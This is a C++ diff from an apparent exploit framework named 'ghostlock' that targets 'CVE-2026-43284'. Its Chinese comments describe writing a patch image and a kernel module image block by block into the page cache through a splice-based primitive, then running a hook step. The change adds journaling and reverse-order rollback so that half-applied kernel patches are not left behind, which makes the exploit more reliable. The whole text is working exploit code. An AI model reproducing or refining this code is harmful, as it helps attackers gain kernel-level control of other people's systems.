@@ -10,6 +10,7 @@
 #include "backend/cve_2026_43284/landing/pagecache_doors.hpp"
 #include "backend/cve_2026_43284/landing/encap_peer.hpp"
 #include "backend/cve_2026_43284/steps/pagecache_steps.hpp"
+#include "backend/cve_2026_43284/steps/pagecache_step_runner.hpp"
 
 #include <fcntl.h>
 #include <unistd.h>
@@ -22,11 +23,15 @@
 
 #include <cstdio>
 #include <cstring>
+#include <vector>
 
 namespace ghostlock::backend::cve_2026_43284::steps {
     namespace {
         inline constexpr const char* kNoAccess = "step-access-missing";
         inline constexpr const char* kWriteRefused = "step-write-refused";
+        /** 旧块读不到时的拒绝名前缀（pagecache_steps.cpp 的 kJournalUnread）：那一块没有进 journal。 */
+        inline constexpr const char* kJournalUnreadPrefix = "step-journal-unread";
+        inline constexpr std::size_t kJournalUnreadPrefixSize = sizeof("step-journal-unread") - 1U;
         /** 模块镜像：一次读进静态缓冲（1 MiB 够放一个 .ko；字节从不进文档）。 */
         inline constexpr std::size_t kModuleImageBytes = 1U << 20U;
         [[nodiscard]] std::byte *module_image() noexcept {
@@ -48,6 +53,55 @@ namespace ghostlock::backend::cve_2026_43284::steps {
         }
 
     }  // namespace
+    std::size_t image_blocks(const std::span<const std::byte> image, const std::size_t width) noexcept {
+        if (width == 0U) {
+            return 0U;
+        }
+        return (image.size() + width - 1U) / width;
+    }
+
+    std::size_t journal_bytes_for(const std::span<const std::byte> image, const std::size_t width) noexcept {
+        return image_blocks(image, width) * width;
+    }
+
+    JournaledWrite write_image_journaled(WriteRequest &request, const std::span<std::byte> journal,
+                                         const char **refusal,
+                                         const std::span<char> decorated_refusal) noexcept {
+        JournaledWrite written{};
+        written.blocks = image_blocks(request.image, request.width);
+        written.capacity_blocks = request.width == 0U ? 0U : journal.size() / request.width;
+        /* 缓冲与容量都交给 steps：容量就是这块 span 能放几条（一块一条，一条 width 字节）。 */
+        request.journal = journal;
+        request.journal_capacity_bytes = journal.size();
+        WriteOutcome outcome{};
+        written.ok = write_image_verified(request, refusal, &outcome);
+        written.outcome = outcome;
+        /* 条数：写之前每块记一条，所以「尝试过的块数」就是条数；失败时到失败块为止。唯一的例外是
+         * step-journal-unread —— 那一块的旧块没读到，因此它没有进 journal（pagecache_steps.cpp 的次序）。 */
+        std::size_t attempted = written.blocks;
+        if (!written.ok) {
+            const char *const named = refusal != nullptr ? *refusal : nullptr;
+            if (request.failed_block == kNoFailedBlock) {
+                attempted = 0U;
+            } else if (named != nullptr &&
+                       std::strncmp(named, kJournalUnreadPrefix, kJournalUnreadPrefixSize) == 0) {
+                attempted = request.failed_block;
+            } else {
+                attempted = request.failed_block + 1U;
+            }
+        }
+        written.entries = attempted < written.capacity_blocks ? attempted : written.capacity_blocks;
+        GL_LOGI("journal: n=%zu overflow=%d rolled=%zu incomplete=%d", written.entries,
+                outcome.journal_overflow ? 1 : 0, outcome.blocks_rolled_back,
+                outcome.rollback_incomplete ? 1 : 0);
+        if (!written.ok && outcome.rollback_incomplete && !decorated_refusal.empty() && refusal != nullptr) {
+            const char *const raw = *refusal != nullptr ? *refusal : kWriteRefused;
+            std::snprintf(decorated_refusal.data(), decorated_refusal.size(), "%s:rollback-incomplete", raw);
+            *refusal = decorated_refusal.data();
+        }
+        return written;
+    }
+
     StepOutcome run_pagecache_step(PagecacheStep step, StepContext &context, const char **refusal) noexcept {
         if (context.params == nullptr || context.door_path == nullptr || context.door_path[0] == '\0') {
             *refusal = kNoAccess;
@@ -103,6 +157,20 @@ namespace ghostlock::backend::cve_2026_43284::steps {
                                                                 : "step-initialize-landing-failed";
             return StepOutcome::Refused;
         }
+        /* 拒绝串的落点：它要活过本函数（上层在返回之后读它），所以是静态的 —— 与加 journal 之前
+         * 那块 detailed 是同一块，两条写路径共用；写成功时不碰它。 */
+        static char detailed[192] = {};
+        /* 失败时把组帧层的失败码接在拒绝名后面（既有行为）。先过一块局部缓冲，源与目标才不会是同一块
+         * —— journal 的 :rollback-incomplete 可能已经把拒绝串写进了 detailed。 */
+        const auto with_splice = [&](const char *named) noexcept -> const char * {
+            if (named == nullptr) {
+                return nullptr;
+            }
+            char composed[224] = {};
+            std::snprintf(composed, sizeof(composed), "%s/splice=%d", named, window.last_error());
+            std::snprintf(detailed, sizeof(detailed), "%s", composed);
+            return detailed;
+        };
         const char *body_refusal = nullptr;
         bool ran = false;
         switch (step) {
@@ -124,17 +192,20 @@ namespace ghostlock::backend::cve_2026_43284::steps {
                 request.verify_every = 0U;
                 /* patch #1 的镜像与来源（成功历史：git show 6f7ded87:src/core/backend/cve_2026_43284/steps/crash_dump.cpp:19-50
                  *  —— 那边 patch #1 = 内嵌 helper 按 kCrashDumpBlockBytes 逐块写进目标，offset 从 0 起）。 */
-                GL_LOGI("patch1: image=%zu offset=%llu width=%zu blocks=%zu source_fd=%d bridge=%d",
+                GL_LOGI("patch1: image=%zu offset=%llu width=%zu blocks=%zu journal_bytes=%zu source_fd=%d bridge=%d",
                         request.image.size(), static_cast<unsigned long long>(request.offset), request.width,
-                        (request.image.size() + request.width - 1U) / request.width, target_fd,
-                        target_fd < 0 ? 1 : 0);
-                ran = write_image_verified(request, &body_refusal);
-                if (!ran && body_refusal != nullptr) {
+                        image_blocks(request.image, request.width),
+                        journal_bytes_for(request.image, request.width), target_fd, target_fd < 0 ? 1 : 0);
+                /* journal：这 90 块每一块都是关键补丁的一部分，失败时按记录**逆序**写回，不留半打的补丁。
+                 * 缓冲是本次请求的局部 vector，长度 = 块数 × 块宽；生命周期到本 case 结束。 */
+                std::vector<std::byte> journal(journal_bytes_for(request.image, request.width));
+                const JournaledWrite ledger = write_image_journaled(
+                        request, std::span<std::byte>(journal.data(), journal.size()), &body_refusal,
+                        std::span<char>(detailed, sizeof(detailed)));
+                ran = ledger.ok;
+                if (!ran) {
                     /* 写入失败时把 splice 的失败码接在拒绝名后面：设备上就靠这个数。 */
-                    static char detailed[128] = {};
-                    std::snprintf(detailed, sizeof(detailed), "%s/splice=%d",
-                                  body_refusal, window.last_error());
-                    body_refusal = detailed;
+                    body_refusal = with_splice(body_refusal);
                 }
 
                 break;
@@ -153,7 +224,16 @@ namespace ghostlock::backend::cve_2026_43284::steps {
                         reinterpret_cast<const std::byte *>(module_image()), module_bytes);
                 request.offset = context.params->carrier_base;
                 request.width = 16U;
-                ran = write_image_verified(request, &body_refusal);
+                /* journal：镜像 23512 B ⇒ 1470 块 ⇒ 23520 B 的局部缓冲。抽样（verify_every 默认 32）
+                 * 只省回读；记录与回滚是逐块的 —— 每块写之前先记旧块，失败即逆序写回。 */
+                std::vector<std::byte> journal(journal_bytes_for(request.image, request.width));
+                const JournaledWrite ledger = write_image_journaled(
+                        request, std::span<std::byte>(journal.data(), journal.size()), &body_refusal,
+                        std::span<char>(detailed, sizeof(detailed)));
+                ran = ledger.ok;
+                if (!ran) {
+                    body_refusal = with_splice(body_refusal);
+                }
                 break;
             }
             case PagecacheStep::Hook: {
